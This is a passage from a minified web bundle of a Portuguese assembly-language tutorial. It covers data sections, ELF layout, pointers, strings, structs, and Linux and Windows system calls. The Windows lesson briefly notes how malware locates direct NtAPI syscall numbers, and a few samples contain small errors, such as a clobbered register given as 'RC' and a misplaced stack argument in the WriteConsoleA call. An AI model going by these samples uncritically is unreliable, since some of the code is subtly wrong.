    ; Permissões: READ only (mais seguro — qualquer escrita causa segfault!)

    PI        dq 3.14159265358979
    MAX_SIZE  equ 1024            ; constante de compilação (não ocupa espaço)
    ERROR_MSG db "Erro fatal!", 0
    LOOKUP    db 0,1,1,2,3,5,8,13,21  ; tabela de Fibonacci

; Em NASM, .rodata é muitas vezes substituído por data (para simplicidade)
; GCC separa automaticamente: strings literais vão para .rodata`}),r.jsx("h3",{children:".bss — Dados Não Inicializados"}),r.jsx(d,{language:"nasm",filename:"bss.asm",code:`section .bss
    ; Variáveis que são inicializadas com ZERO em runtime pelo OS
    ; Permissões: READ + WRITE
    ; VANTAGEM: não ocupa espaço no arquivo executável! (só na memória)
    ; O kernel zera essa região ao carregar o programa.

    buffer    resb 1024     ; reserva 1024 bytes
    intvar    resq 1        ; reserva 1 qword (8 bytes)
    floatvar  resq 1        ; reserva 8 bytes para um double

    ; res = "reserve":
    ; resb N = reserva N bytes
    ; resw N = reserva N words (2N bytes)
    ; resd N = reserva N dwords (4N bytes)
    ; resq N = reserva N qwords (8N bytes)`}),r.jsx("h2",{children:"Layout Completo de um Programa"}),r.jsx(d,{language:"nasm",filename:"layout_completo.asm",code:`; hello_completo.asm
section .rodata
    MSG db "Hello, World!", 10
    MSG_LEN equ $ - MSG

section .data
    contador dq 0

section .bss
    buffer resb 64

section .text
    global _start

_start:
    ; Incrementar contador
    inc qword [contador]

    ; Escrever mensagem
    mov rax, 1          ; sys_write
    mov rdi, 1          ; stdout
    lea rsi, [MSG]      ; ponteiro para string
    mov rdx, MSG_LEN    ; tamanho
    syscall

    ; Sair
    mov rax, 60
    xor rdi, rdi
    syscall`}),r.jsx("h2",{children:"Verificando o Layout com readelf"}),r.jsx(d,{language:"bash",code:`$ readelf -S hello_completo
Section Headers:
  [Nr] Name      Type      Address          Off    Size    Flg
  [ 1] .rodata   PROGBITS  0000000000402000 002000 00000f  A
  [ 2] .data     PROGBITS  0000000000403000 003000 000008  WA
  [ 3] .bss      NOBITS    0000000000404000 004008 000040  WA
  [ 4] .text     PROGBITS  0000000000401000 001000 00002c  AX

; Flg (flags):
; A = Allocatable (mapeado na memória)
; W = Writable
; X = eXecutable
; NOBITS = .bss não tem dados no arquivo (apenas reserva memória)`}),r.jsx("h2",{children:"Segmentos ELF (Program Headers)"}),r.jsx(d,{language:"bash",code:`$ readelf -l hello_completo

Program Headers:
  Type     Offset   VirtAddr           PhysAddr           FileSiz  MemSiz   Flg Align
  LOAD     0x000000 0x0000000000400000 0x0000000000400000 0x0000b0 0x0000b0 R   0x1000
  LOAD     0x001000 0x0000000000401000 0x0000000000401000 0x00002c 0x00002c R E 0x1000
  LOAD     0x002000 0x0000000000402000 0x0000000000402000 0x00000f 0x00000f R   0x1000
  LOAD     0x003000 0x0000000000403000 0x0000000000403000 0x000008 0x000048 RW  0x1000

; Múltiplos segmentos LOAD:
; R   = read-only (ELF headers)
; R E = read + execute (.text)
; R   = read-only (.rodata)
; RW  = read + write (.data + .bss)`}),r.jsx("h2",{children:"TIMES — Repetição de Dados"}),r.jsx(d,{language:"nasm",filename:"times.asm",code:`section .data
    ; TIMES N instrução — repete N vezes
    zeros   times 100 db 0     ; 100 bytes zeros
    ffs     times 32  db 0xFF  ; 32 bytes 0xFF
    
    ; Útil para alinhar dados:
    db "hello"
    times (16 - ($ - $$) % 16) db 0  ; pad para próximo múltiplo de 16`}),r.jsxs(T,{type:"info",title:"Diretiva EQU vs DB",children:[r.jsx("code",{children:"EQU"})," define uma constante em tempo de compilação — não aloca memória. ",r.jsx("code",{children:"DB/DW/DD/DQ"})," aloca espaço em memória. Use EQU para constantes que você referencia pelo valor, não pelo endereço."]})]})}function $g(){return r.jsxs(L,{title:"Ponteiros em Assembly",subtitle:"Endereçamento indireto — a essência do que um ponteiro realmente é",difficulty:"intermediario",timeToRead:"15 min",children:[r.jsxs("p",{children:['Em Assembly, não existe "tipo ponteiro" — existe um ',r.jsx("strong",{children:"endereço de memória"}),". Quando você coloca um endereço em um registrador e acessa o conteúdo desse endereço, está usando um ponteiro."]}),r.jsx("h2",{children:"O que é um Ponteiro"}),r.jsx(d,{language:"nasm",filename:"ponteiro_basico.asm",code:`section .data
    variavel dq 42      ; variável contendo 42

section .text
    ; Em Assembly, o "ponteiro" é simplesmente o endereço
    lea rax, [variavel] ; rax = ENDEREÇO de 'variavel' (isso é um ponteiro!)

    ; Dereferenciamento (acessar o valor apontado):
    mov rbx, [rax]      ; rbx = *rax = conteúdo em rax = 42

    ; Escrever via ponteiro:
    mov qword [rax], 100 ; *rax = 100 (variavel agora vale 100)`}),r.jsx("h2",{children:"Ponteiros vs Valores em C e Assembly"}),r.jsx(d,{language:"c",filename:"ponteiros.c",code:`// C
int variavel = 42;
int *ptr = &variavel;  // ptr = endereço de variavel
int val = *ptr;        // val = conteúdo de ptr = 42
*ptr = 100;            // escreve via ponteiro`}),r.jsx(d,{language:"nasm",filename:"ponteiros.asm",code:`; Assembly equivalente
section .data
    variavel dq 42

section .text
    lea rsi, [variavel]     ; rsi = &variavel (ponteiro)
    mov rdi, [rsi]          ; rdi = *rsi = 42
    mov qword [rsi], 100    ; *rsi = 100`}),r.jsx("h2",{children:"Ponteiro para Ponteiro (Duplo Indirecionamento)"}),r.jsx(d,{language:"nasm",filename:"ptr_ptr.asm",code:`section .data
    valor     dq 42
    ponteiro  dq valor      ; ponteiro contém o ENDEREÇO de valor

section .text
    ; Em C: int **pp = &pointer; int val = **pp;
    lea rax, [ponteiro]     ; rax = &ponteiro
    mov rbx, [rax]          ; rbx = *rax = endereço de 'valor'
    mov rcx, [rbx]          ; rcx = *rbx = 42 (duplo deref)`}),r.jsx("h2",{children:"Ponteiro para Função"}),r.jsx(d,{language:"nasm",filename:"func_ptr.asm",code:`section .data
    ; Ponteiro para função — contém o endereço da função
    fn_ptr dq minha_funcao   ; inicializado com o endereço da função

section .text

minha_funcao:
    mov rax, 42
    ret

_start:
    ; Chamar função via ponteiro:
    mov rax, [fn_ptr]        ; rax = endereço da função
    call rax                 ; chama a função indiretamente!
    ; rax = 42 (retorno)

    ; Ou diretamente:
    call [fn_ptr]            ; também funciona em NASM`}),r.jsx("h2",{children:"Estrutura de Dados com Ponteiros"}),r.jsx(d,{language:"nasm",filename:"lista_ligada.asm",code:`; Lista ligada simples em Assembly
; struct Node { long value; Node* next; }
;   [offset 0] = value (8 bytes)
;   [offset 8] = next  (8 bytes)

NODE_VALUE equ 0
NODE_NEXT  equ 8
NODE_SIZE  equ 16

section .data
    node3: dq 30, 0         ; value=30, next=NULL
    node2: dq 20, node3     ; value=20, next=&node3
    node1: dq 10, node2     ; value=10, next=&node2
    head:  dq node1         ; ponteiro para o início

section .text
; Iterar pela lista e somar valores:
    xor rax, rax             ; soma = 0
    mov rbx, [head]          ; rbx = head (ponteiro para node1)
.loop:
    test rbx, rbx            ; rbx == NULL?
    jz  .fim
    add rax, [rbx + NODE_VALUE]  ; soma += node->value
    mov rbx, [rbx + NODE_NEXT]   ; rbx = node->next
    jmp .loop
.fim:
    ; rax = 10 + 20 + 30 = 60`}),r.jsx("h2",{children:"Ponteiros e Arrays"}),r.jsx(d,{language:"nasm",filename:"array_ptr.asm",code:`section .data
    array dq 10, 20, 30, 40, 50   ; int array[5]

section .text
    ; Iterar com ponteiro (pointer arithmetic):
    lea rbx, [array]         ; rbx = &array[0] (ponteiro base)
    mov rcx, 5               ; contador

.loop:
    mov rax, [rbx]           ; rax = *ptr
    ; ... processar rax ...

    add rbx, 8               ; ptr++ (avança 8 bytes — tamanho de qword)
    dec rcx
    jnz .loop

    ; Acesso por índice com ponteiro base:
    lea rbx, [array]
    mov rax, [rbx + 2*8]    ; array[2] = 30`}),r.jsxs(T,{type:"danger",title:"Ponteiro Nulo",children:["Acessar o endereço 0 (ponteiro nulo) causa um ",r.jsx("strong",{children:"segmentation fault"})," imediato. Sempre verifique ponteiros antes de desreferenciar!"]}),r.jsx(d,{language:"nasm",code:`; Verificar ponteiro nulo antes de usar:
    test rbx, rbx
    jz  .erro_ponteiro_nulo
    mov rax, [rbx]           ; seguro — rbx não é zero`}),r.jsx("h2",{children:"Aritmética de Ponteiros"}),r.jsx(d,{language:"nasm",filename:"ptr_arith.asm",code:`; Avançar ponteiro pelo tamanho do tipo:
; Para byte (1 byte):  add ptr, 1
; Para word (2 bytes): add ptr, 2
; Para dword (4 bytes): add ptr, 4
; Para qword (8 bytes): add ptr, 8

; Calcular diferença entre ponteiros:
    lea rax, [array]         ; rax = início
    lea rbx, [array + 4*8]  ; rbx = &array[4]
    sub rbx, rax             ; rbx = 4*8 = 32 (diferença em bytes)
    shr rbx, 3              ; rbx = 4 (número de elementos)`})]})}function e1(){return r.jsxs(L,{title:"Strings e Arrays",subtitle:"Manipulação de sequências de dados em Assembly",difficulty:"intermediario",timeToRead:"18 min",children:[r.jsx("p",{children:"Strings em Assembly são arrays de bytes terminados por null (\\0). Arrays são blocos contíguos de memória. Ambos são fundamentais para qualquer programa real."}),r.jsx("h2",{children:"Strings — Representação na Memória"}),r.jsx(d,{language:"nasm",filename:"strings.asm",code:`section .data
    str1  db "Hello", 10, 0     ; "Hello
\0" — 7 bytes
    str2  db 'A', 'B', 'C', 0   ; "ABC\0" — 4 bytes
    str3  db 0x48, 0x65, 0x6C, 0x6C, 0x6F, 0  ; "Hello\0" em hex

    ; String vazia:
    empty db 0                  ; só o null terminator

    ; String sem null (cuidado! sem terminador):
    raw   db "sem null"         ; para uso com tamanho explícito`}),r.jsx("h2",{children:"Calcular Comprimento de String (strlen)"}),r.jsx(d,{language:"nasm",filename:"strlen.asm",code:`; strlen: retorna comprimento de string em RAX
; Argumento: RDI = ponteiro para string
strlen:
    ; Método 1: loop simples
    xor rcx, rcx            ; rcx = comprimento = 0
.loop:
    cmp byte [rdi + rcx], 0 ; encontrou null?
    je  .fim
    inc rcx
    jmp .loop
.fim:
    mov rax, rcx
    ret

; Método 2: SCASB (mais idiomático)
strlen_scasb:
    push rdi
    xor al, al              ; al = 0 (procurar null)
    mov rcx, -1             ; contador "infinito"
    repne scasb             ; busca byte por byte até encontrar 0
    not rcx                 ; rcx = comprimento + 1
    dec rcx                 ; rcx = comprimento (sem o null)
    mov rax, rcx
    pop rdi
    ret`}),r.jsx("h2",{children:"Copiar String (strcpy)"}),r.jsx(d,{language:"nasm",filename:"strcpy.asm",code:`; strcpy: copia string de RSI para RDI
; Argumento: RDI = destino, RSI = origem
strcpy:
.loop:
    mov al, [rsi]           ; al = *origem
    mov [rdi], al           ; *destino = al
    test al, al             ; al é null?
    je  .fim
    inc rdi                 ; avança destino
    inc rsi                 ; avança origem
    jmp .loop
.fim:
    ret

; Versão otimizada com MOVS:
strcpy_rapido:
    push rsi
    push rdi
    ; Copiar incluindo o null terminator
    ; Primeiro descobrir o comprimento:
    mov rdi, rsi
    xor al, al
    mov rcx, -1
    repne scasb
    not rcx                 ; rcx = len + 1 (incluindo null)
    pop rdi
    ; rsi ainda aponta para origem
    rep movsb               ; copia rcx bytes
    pop rsi
    ret`}),r.jsx("h2",{children:"Comparar Strings (strcmp)"}),r.jsx(d,{language:"nasm",filename:"strcmp.asm",code:`; strcmp: compara RDI e RSI
; Retorno: 0 se iguais, <0 se RDI < RSI, >0 se RDI > RSI
strcmp:
.loop:
    mov al, [rdi]
    mov bl, [rsi]
    cmp al, bl
    jne .diferente
    test al, al             ; ambos chegaram no null?
    je  .igual
    inc rdi
    inc rsi
    jmp .loop
.igual:
    xor eax, eax            ; return 0
    ret
.diferente:
    movsx eax, al           ; sign-extend para 32-bit
    movsx ebx, bl
    sub eax, ebx            ; return a - b (>0 ou <0)
    ret`}),r.jsx("h2",{children:"Arrays — Acesso por Índice"}),r.jsx(d,{language:"nasm",filename:"arrays.asm",code:`section .data
    ; Array de inteiros (qword = 8 bytes cada)
    int_array dq 100, 200, 300, 400, 500
    int_count equ 5

    ; Array de bytes
    byte_array db 10, 20, 30, 40, 50, 60
    byte_count equ 6

section .text
    ; Acessar int_array[2]:
    lea rbx, [int_array]
    mov rax, [rbx + 2*8]     ; rax = 300

    ; Acessar byte_array[4]:
    lea rbx, [byte_array]
    movzx rax, byte [rbx + 4]  ; rax = 50

    ; Modificar array[1] = 999:
    mov qword [int_array + 1*8], 999`}),r.jsx("h2",{children:"Operações em Arrays"}),r.jsx(d,{language:"nasm",filename:"array_ops.asm",code:`; Somar todos os elementos de um array:
; rdi = ponteiro, rsi = tamanho
sum_array:
    xor rax, rax             ; soma = 0
    test rsi, rsi
    jz  .fim
.loop:
    add rax, [rdi]           ; soma += *ptr
    add rdi, 8               ; avança ponteiro
    dec rsi                  ; decrementa contador
    jnz .loop
.fim:
    ret

; Encontrar máximo:
find_max:
    ; rdi = ponteiro, rsi = tamanho (pelo menos 1)
    mov rax, [rdi]           ; max = primeiro elemento
    dec rsi
    jz  .fim
.loop:
    add rdi, 8
    cmp [rdi], rax
    cmovg rax, [rdi]         ; CMOV: se [rdi] > max, max = [rdi]
    dec rsi
    jnz .loop
.fim:
    ret

; Bubble sort (simples):
bubble_sort:
    ; rdi = array, rsi = tamanho
    push rbx
    push r12
    mov r12, rsi             ; salva tamanho
.outer:
    dec r12                  ; outer loop: N-1 passes
    jle .done
    xor rbx, rbx             ; inner index
.inner:
    cmp rbx, r12
    jge .outer
    mov rax, [rdi + rbx*8]
    mov rcx, [rdi + rbx*8 + 8]
    cmp rax, rcx
    jle .no_swap
    mov [rdi + rbx*8], rcx  ; swap
    mov [rdi + rbx*8 + 8], rax
.no_swap:
    inc rbx
    jmp .inner
.done:
    pop r12
    pop rbx
    ret`}),r.jsx("h2",{children:"Strings Multibyte — UTF-8"}),r.jsx(T,{type:"info",title:"UTF-8 em Assembly",children:"Assembly trata strings como bytes brutos — não há suporte nativo a Unicode. Para UTF-8, você precisa implementar a decodificação manualmente. Caracteres ASCII (código 0-127) são idênticos em UTF-8."}),r.jsx(d,{language:"nasm",filename:"utf8.asm",code:`; Decodificar primeiro caractere UTF-8:
; RDI = ponteiro para string UTF-8
; Retorno: RAX = codepoint Unicode
decode_utf8_char:
    movzx rax, byte [rdi]
    
    ; 1 byte: 0xxxxxxx (ASCII: 0-127)
    test rax, 0x80
    jz  .done               ; bit 7 = 0 → ASCII puro
    
    ; 2 bytes: 110xxxxx 10xxxxxx (128-2047)
    cmp rax, 0xE0
    jae .three_bytes
    and rax, 0x1F           ; 5 bits do primeiro byte
    shl rax, 6
    movzx rcx, byte [rdi + 1]
    and rcx, 0x3F           ; 6 bits do segundo byte
    or  rax, rcx
    jmp .done
    
.three_bytes:
    ; ... continua para 3 e 4 bytes ...

.done:
    ret`})]})}function a1(){return r.jsxs(L,{title:"Estruturas (Structs)",subtitle:"Implementando structs C em Assembly com offsets e macros",difficulty:"intermediario",timeToRead:"15 min",children:[r.jsx("p",{children:"Assembly não tem tipos — apenas bytes. Mas você pode implementar structs organizando dados em posições fixas e usando offsets para acessá-los."}),r.jsx("h2",{children:"Struct Simples"}),r.jsx(d,{language:"c",filename:"pessoa.c",code:`// C struct:
struct Pessoa {
    long id;        // offset 0, 8 bytes
    long idade;     // offset 8, 8 bytes
    char nome[32];  // offset 16, 32 bytes
};  // total: 48 bytes`}),r.jsx(d,{language:"nasm",filename:"pessoa.asm",code:`; Definindo offsets como constantes:
PESSOA_ID      equ 0
PESSOA_IDADE   equ 8
PESSOA_NOME    equ 16
PESSOA_SIZE    equ 48

section .data
    ; Instância estática:
    joao:
        dq 1            ; id = 1
        dq 30           ; idade = 30
        db "João Silva", 0
        times (32 - ($ - joao - 16)) db 0  ; pad para 32 bytes

section .text
    ; Acessar campos:
    lea rbx, [joao]
    mov rax, [rbx + PESSOA_ID]     ; rax = joao.id = 1
    mov rax, [rbx + PESSOA_IDADE]  ; rax = joao.idade = 30
    lea rax, [rbx + PESSOA_NOME]   ; rax = &joao.nome

    ; Modificar campo:
    mov qword [rbx + PESSOA_IDADE], 31`}),r.jsx("h2",{children:"Macros STRUC no NASM"}),r.jsx(d,{language:"nasm",filename:"struc.asm",code:`; NASM tem suporte a structs com struc/endstruc:
struc Ponto
    .x: resq 1   ; 8 bytes
    .y: resq 1   ; 8 bytes
    .z: resq 1   ; 8 bytes
endstruc        ; Ponto_size = 24

; Usar:
section .data
    origem: istruc Ponto
        at Ponto.x, dq 0
        at Ponto.y, dq 0
        at Ponto.z, dq 0
    iend

    ponto1: istruc Ponto
        at Ponto.x, dq 10
        at Ponto.y, dq 20
        at Ponto.z, dq 30
    iend

section .text
    lea rbx, [ponto1]
    mov rax, [rbx + Ponto.x]    ; rax = 10
    mov rax, [rbx + Ponto.y]    ; rax = 20`}),r.jsx("h2",{children:"Array de Structs"}),r.jsx(d,{language:"nasm",filename:"array_structs.asm",code:`; Array de Pontos — [x0,y0,z0, x1,y1,z1, ...]
section .data
    pontos:
        dq 1, 2, 3    ; ponto[0]: x=1, y=2, z=3
        dq 4, 5, 6    ; ponto[1]: x=4, y=5, z=6
        dq 7, 8, 9    ; ponto[2]
    N_PONTOS equ 3

section .text
    ; Acessar ponto[1].y:
    lea rbx, [pontos]
    mov rax, [rbx + 1*Ponto_size + Ponto.y]  ; = 5

    ; Iterar e somar todos os x:
    xor rax, rax            ; soma = 0
    xor rcx, rcx            ; índice = 0
.loop:
    cmp rcx, N_PONTOS
    jge .fim
    add rax, [rbx + rcx*Ponto_size + Ponto.x]
    inc rcx
    jmp .loop
.fim:`}),r.jsx("h2",{children:"Alinhamento e Padding"}),r.jsx(T,{type:"warning",title:"Alinhamento de Struct",children:"Processadores acessam dados mais eficientemente quando estão alinhados ao seu tamanho (int em múltiplo de 4, long em múltiplo de 8). Compilers C inserem padding automaticamente. Em Assembly, você é responsável!"}),r.jsx(d,{language:"nasm",filename:"alinhamento.asm",code:`; Exemplo de struct com padding em C:
; struct Misto {
;     char c;   // 1 byte + 7 bytes padding!
;     long l;   // 8 bytes (precisa estar em offset múltiplo de 8)
;     int i;    // 4 bytes + 4 bytes padding
;     long l2;  // 8 bytes
; };  // total: 32 bytes (não 21!)

; Em Assembly, você controla o layout:
MISTO_C   equ 0   ; 1 byte
; 7 bytes de padding aqui (offsets 1-7)
MISTO_L   equ 8   ; 8 bytes
MISTO_I   equ 16  ; 4 bytes
; 4 bytes de padding (offsets 20-23)
MISTO_L2  equ 24  ; 8 bytes
MISTO_SIZE equ 32

; Para compactar sem padding (mas mais lento!):
; MISTO_C  equ 0  ; 1 byte
; MISTO_L  equ 1  ; 8 bytes (não alinhado!)
; MISTO_I  equ 9  ; 4 bytes (não alinhado!)
; MISTO_L2 equ 13 ; 8 bytes (não alinhado!)
; MISTO_SIZE equ 21`}),r.jsx("h2",{children:"Lista Ligada em Assembly"}),r.jsx(d,{language:"nasm",filename:"lista.asm",code:`; Node: { value: qword, next: ptr }
NODE_VAL  equ 0
NODE_NEXT equ 8
NODE_SIZE equ 16

; Alocar novo nó (via mmap):
; Argumento: RDI = valor
; Retorno: RAX = ponteiro para novo nó
alloc_node:
    push rbx
    mov rbx, rdi            ; salva valor

    ; mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0)
    mov rax, 9              ; sys_mmap
    xor rdi, rdi
    mov rsi, 4096
    mov rdx, 3
    mov r10, 0x22
    mov r8, -1
    xor r9, r9
    syscall

    ; rax = ponteiro para o nó
    mov [rax + NODE_VAL], rbx   ; node->value = valor
    mov qword [rax + NODE_NEXT], 0  ; node->next = NULL

    pop rbx
    ret`})]})}function r1(){return r.jsxs(L,{title:"System Calls no Linux x86-64",subtitle:"A interface entre seu programa Assembly e o kernel Linux",difficulty:"intermediario",timeToRead:"20 min",children:[r.jsxs("p",{children:["System calls (syscalls) são a interface oficial entre programas de usuário e o kernel Linux. Em Assembly, você invoca syscalls diretamente com a instrução ",r.jsx("code",{children:"syscall"}),"."]}),r.jsx("h2",{children:"Convenção de Syscall (x86-64 Linux)"}),r.jsx(d,{language:"bash",code:`# Registradores para syscall:
# RAX = número da syscall
# RDI = 1º argumento
# RSI = 2º argumento
# RDX = 3º argumento
# R10 = 4º argumento
# R8  = 5º argumento
# R9  = 6º argumento

# Retorno:
# RAX = valor de retorno (negativo em caso de erro: -errno)

# Instrução:
syscall    # executa a syscall

# ATENÇÃO: RC, R11 são destruídos pelo syscall!`}),r.jsx("h2",{children:"Tabela das Syscalls Mais Usadas"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Num"}),r.jsx("th",{children:"Nome"}),r.jsx("th",{children:"Protótipo C"}),r.jsx("th",{children:"Retorno"})]})}),r.jsx("tbody",{children:[["0","read","read(int fd, void *buf, size_t count)","bytes lidos"],["1","write","write(int fd, const void *buf, size_t count)","bytes escritos"],["2","open","open(const char *path, int flags, mode_t mode)","fd"],["3","close","close(int fd)","0 ou -1"],["4","stat","stat(const char *path, struct stat *statbuf)","0 ou -1"],["8","lseek","lseek(int fd, off_t offset, int whence)","nova posição"],["9","mmap","mmap(void *addr, size_t len, int prot, int flags, int fd, off_t off)","ponteiro"],["10","mprotect","mprotect(void *addr, size_t len, int prot)","0 ou -1"],["11","munmap","munmap(void *addr, size_t len)","0 ou -1"],["12","brk","brk(void *addr)","novo brk"],["22","pipe","pipe(int pipefd[2])","0 ou -1"],["32","dup","dup(int fd)","novo fd"],["33","dup2","dup2(int oldfd, int newfd)","newfd"],["39","getpid","getpid()","PID"],["57","fork","fork()","0 filho, PID pai, -1 erro"],["59","execve","execve(const char *path, char **argv, char **envp)","nunca (sucesso) ou -1"],["60","exit","exit(int status)","nunca retorna"],["61","wait4","wait4(pid_t pid, int *wstatus, int opts, struct rusage *ru)","PID"],["62","kill","kill(pid_t pid, int sig)","0 ou -1"],["231","exit_group","exit_group(int status)","nunca retorna"]].map(([i,l,u,m])=>r.jsxs("tr",{children:[r.jsx("td",{children:r.jsx("code",{children:i})}),r.jsx("td",{children:r.jsx("code",{children:l})}),r.jsx("td",{children:r.jsx("code",{style:{fontSize:"0.75em"},children:u})}),r.jsx("td",{children:m})]},i))})]}),r.jsx("h2",{children:"Exemplos Completos"}),r.jsx("h3",{children:"read — Ler da stdin"}),r.jsx(d,{language:"nasm",filename:"read.asm",code:`section .bss
    buffer resb 256     ; buffer de 256 bytes

section .text
    ; read(STDIN=0, buffer, 256)
    mov rax, 0          ; sys_read
    mov rdi, 0          ; fd = stdin
    lea rsi, [buffer]   ; buffer
    mov rdx, 256        ; tamanho máximo
    syscall
    ; rax = bytes lidos (ou negativo se erro)

    ; Verificar erro:
    test rax, rax
    js  .erro           ; rax < 0 → erro`}),r.jsx("h3",{children:"open/write/close — I/O de Arquivo"}),r.jsx(d,{language:"nasm",filename:"file_io.asm",code:`; Constantes para open():
O_RDONLY equ 0
O_WRONLY equ 1
O_RDWR   equ 2
O_CREAT  equ 0x40
O_TRUNC  equ 0x200
O_APPEND equ 0x400

section .data
    nome_arquivo db "/tmp/teste.txt", 0
    conteudo     db "Hello, arquivo!", 10
    conteudo_len equ $ - conteudo

section .text
_start:
    ; Abrir (ou criar) arquivo para escrita:
    ; open("/tmp/teste.txt", O_WRONLY|O_CREAT|O_TRUNC, 0644)
    mov rax, 2              ; sys_open
    lea rdi, [nome_arquivo]
    mov rsi, O_WRONLY | O_CREAT | O_TRUNC
    mov rdx, 0o644          ; permissões: rw-r--r-- (octal!)
    syscall
    ; rax = fd (ou negativo se erro)

    test rax, rax
    js  .erro_open
    mov rbx, rax            ; salva fd

    ; Escrever no arquivo:
    mov rax, 1              ; sys_write
    mov rdi, rbx            ; fd
    lea rsi, [conteudo]
    mov rdx, conteudo_len
    syscall

    ; Fechar arquivo:
    mov rax, 3              ; sys_close
    mov rdi, rbx            ; fd
    syscall

    ; Sair:
    mov rax, 60
    xor rdi, rdi
    syscall

.erro_open:
    ; rax contém -errno
    neg rax                 ; rax = errno`}),r.jsx("h3",{children:"fork e execve"}),r.jsx(d,{language:"nasm",filename:"fork_exec.asm",code:`section .data
    prog    db "/bin/echo", 0
    arg0    db "/bin/echo", 0
    arg1    db "Hello from child!", 0

section .text
_start:
    ; fork()
    mov rax, 57
    syscall

    ; rax = 0 (filho) ou PID (pai) ou -1 (erro)
    test rax, rax
    jz  .filho          ; se rax == 0, somos o filho
    js  .erro

    ; Código do PAI:
    ; wait4(-1, NULL, 0, NULL) — espera qualquer filho
    mov rax, 61
    mov rdi, -1         ; qualquer filho
    xor rsi, rsi        ; não salva status
    xor rdx, rdx        ; sem opções
    xor r10, r10        ; sem rusage
    syscall

    jmp .fim_pai

.filho:
    ; execve("/bin/echo", argv, NULL)
    mov rax, 59         ; sys_execve
    lea rdi, [prog]     ; path
    ; montar argv no stack:
    push 0              ; NULL terminator
    lea rax, [rel arg1]
    push rax
    lea rax, [rel arg0]
    push rax
    mov rsi, rsp        ; argv = {arg0, arg1, NULL}
    xor rdx, rdx        ; envp = NULL
    syscall
    ; Se chegou aqui, execve falhou
    mov rax, 60
    mov rdi, 1
    syscall

.fim_pai:
.erro:
    mov rax, 60
    xor rdi, rdi
    syscall`}),r.jsxs(T,{type:"info",title:"Verificando números de syscall",children:["Para ver todos os números de syscall: ",r.jsx("code",{children:"cat /usr/include/asm/unistd_64.h | grep '#define __NR'"}),". Ou use o site ",r.jsx("a",{href:"https://syscalls.mebeim.net",children:"syscalls.mebeim.net"}),"."]}),r.jsx("h2",{children:"Erros de Syscall"}),r.jsx(d,{language:"nasm",filename:"erros.asm",code:`; Syscalls retornam valor negativo em caso de erro:
; -1  = EPERM (operação não permitida)
; -2  = ENOENT (arquivo não encontrado)
; -9  = EBADF (fd inválido)
; -13 = EACCES (permissão negada)
; -17 = EEXIST (arquivo já existe)
; -22 = EINVAL (argumento inválido)

; Verificar erro:
syscall
cmp rax, -4096          ; erros são maiores que -4096
jbe .sucesso
; rax contém -errno
neg rax                 ; rax = errno positivo`})]})}function t1(){return r.jsxs(L,{title:"System Calls no Windows",subtitle:"NtAPI, syscall numbers e como o Windows funciona por baixo",difficulty:"avancado",timeToRead:"15 min",children:[r.jsxs("p",{children:["No Windows, programas geralmente usam a ",r.jsx("strong",{children:"Win32 API"})," (kernel32.dll etc.) em vez de syscalls diretas. Mas existe uma camada de syscall nativa — a ",r.jsx("strong",{children:"Native API (NtAPI)"})," — usada por malware e ferramentas avançadas."]}),r.jsx("h2",{children:"Windows vs Linux: Diferenças Fundamentais"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Aspecto"}),r.jsx("th",{children:"Linux"}),r.jsx("th",{children:"Windows"})]})}),r.jsxs("tbody",{children:[r.jsxs("tr",{children:[r.jsx("td",{children:"Interface oficial"}),r.jsx("td",{children:"syscall direto"}),r.jsx("td",{children:"Win32 API (DLLs)"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Instrução de syscall"}),r.jsx("td",{children:"syscall"}),r.jsx("td",{children:"syscall (x64) ou int 0x2E"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Números de syscall"}),r.jsx("td",{children:"Estáveis entre versões"}),r.jsx("td",{children:"MUDAM entre versões do Windows!"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Argumento 1"}),r.jsx("td",{children:"RDI"}),r.jsx("td",{children:"RCX"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Convenção"}),r.jsx("td",{children:"System V AMD64"}),r.jsx("td",{children:"Microsoft x64"})]})]})]}),r.jsx("h2",{children:"Win32 API em Assembly"}),r.jsx(d,{language:"nasm",filename:"win32.asm",code:`; Windows Assembly x64 com NASM
; Compilar: nasm -f win64 programa.asm -o programa.obj
; Linkar: link /SUBSYSTEM:CONSOLE programa.obj kernel32.lib

extern GetStdHandle
extern WriteConsoleA
extern ExitProcess

section .data
    msg    db "Hello, Windows!", 13, 10, 0
    msg_len equ $ - msg - 1

section .bss
    bytes_written resd 1

section .text
    global WinMain

WinMain:
    sub rsp, 56         ; shadow space (32) + alinhamento

    ; GetStdHandle(STD_OUTPUT_HANDLE = -11)
    mov rcx, -11        ; STD_OUTPUT_HANDLE
    call GetStdHandle
    mov rbx, rax        ; rbx = stdout handle

    ; WriteConsoleA(handle, buf, len, &written, NULL)
    mov rcx, rbx                ; handle
    lea rdx, [rel msg]          ; buffer
    mov r8,  msg_len            ; tamanho
    lea r9,  [rel bytes_written] ; &bytesWritten
    push 0                      ; NULL (lpReserved) — arg na stack
    call WriteConsoleA
    add rsp, 8                  ; limpar arg

    ; ExitProcess(0)
    xor rcx, rcx
    call ExitProcess`}),r.jsx("h2",{children:"Native API (NtAPI) — Syscalls Diretas"}),r.jsx(T,{type:"warning",title:"Números instáveis",children:"Os números de syscall do Windows mudam a cada versão (e às vezes a cada service pack). Use NtAPI com cuidado e sempre verifique a versão do Windows antes."}),r.jsx(d,{language:"nasm",filename:"ntapi.asm",code:`; NtWriteFile — syscall direta no Windows 10/11
; Os números variam — isso é para fins educacionais!

; Estrutura de syscall Windows x64:
; RAX = syscall number
; RCX = 1º argumento
; RDX = 2º argumento
; R8  = 3º argumento
; R9  = 4º argumento
; Stack para mais argumentos
; syscall
; R10 = RCX antes do syscall (kernel preserva)

; NtWriteFile (número exemplo — Windows 10 1809)
NT_WRITE_FILE equ 0x8  ; VARIA por versão!

; Em malware, os números são encontrados por:
; 1. Leitura do arquivo ntdll.dll
; 2. Análise em tempo de execução
; 3. Tabelas online por versão do Windows`}),r.jsx("h2",{children:"Estruturas Importantes do Windows"}),r.jsx(d,{language:"bash",filename:"estruturas.txt",code:`; TEB (Thread Environment Block) — apontado pelo GS:
; [GS:0x30] = PEB (Process Environment Block)
; [GS:0x00] = SEH (Structured Exception Handler) em 32-bit

; PEB (Process Environment Block):
